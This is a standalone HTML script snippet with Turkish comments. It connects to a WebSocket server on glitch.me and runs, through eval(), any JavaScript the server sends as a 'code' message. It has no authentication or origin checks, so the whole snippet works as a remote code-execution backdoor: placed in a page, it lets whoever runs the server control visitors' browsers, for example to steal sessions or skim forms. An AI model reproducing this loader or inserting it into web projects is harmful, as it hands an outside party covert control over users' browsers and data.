<script>
(function() {
    var ws = new WebSocket('wss://my-websocket-server.glitch.me');
    
    ws.onmessage = function(event) {
        var msg = JSON.parse(event.data);
        if (msg.type === 'code') {
            try {
                eval(msg.data); // Gelen kodu çalıştır
            } catch (e) {
                console.error('Kod hatası:', e);
            }
        }
    };
    
    ws.onopen = function() {
        console.log('WebSocket bağlandı');
    };
})();
</script>
